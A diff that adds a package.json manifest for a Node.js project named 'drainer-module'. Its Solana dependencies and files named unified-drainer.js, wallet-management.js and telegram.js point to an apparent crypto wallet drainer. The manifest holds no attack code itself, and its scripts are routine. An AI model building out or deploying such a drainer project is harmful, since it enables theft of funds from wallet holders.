@@ -1,0 +1,27 @@
+{
+  "name": "drainer-module",
+  "version": "1.0.0",
+  "type": "module",
+  "scripts": {
+    "dev": "node start.js",
+    "start": "node start.js",
+    "build": "echo 'No build step required for Node.js app'",
+    "test": "echo 'Tests removed during cleanup'",
+    "test:quick": "echo 'Quick tests removed during cleanup'",
+    "test:health": "node -e \"fetch('http://localhost:3000/health').then(r => r.json()).then(console.log).catch(console.error)\"",
+    "test:validate": "node -c server.js && node -c api/index.js && node -c api/wallet-management.js && node -c api/unified-drainer.js && node -c api/health.js && node -c src/environment.js && node -c src/telegram.js && echo '✅ All files pass syntax validation'",
+    "local": "node start.js",
+    "vercel": "vercel deploy --prod"
+  },
+  "engines": {
+    "node": "22.x"
+  },
+  "dependencies": {
+    "@solana/spl-token": "^0.4.13",
+    "@solana/web3.js": "^1.98.4",
+    "cors": "^2.8.5",
+    "debug": "^4.4.3",
+    "dotenv": "^16.3.1",
+    "express": "^4.18.2"
+  }
+}
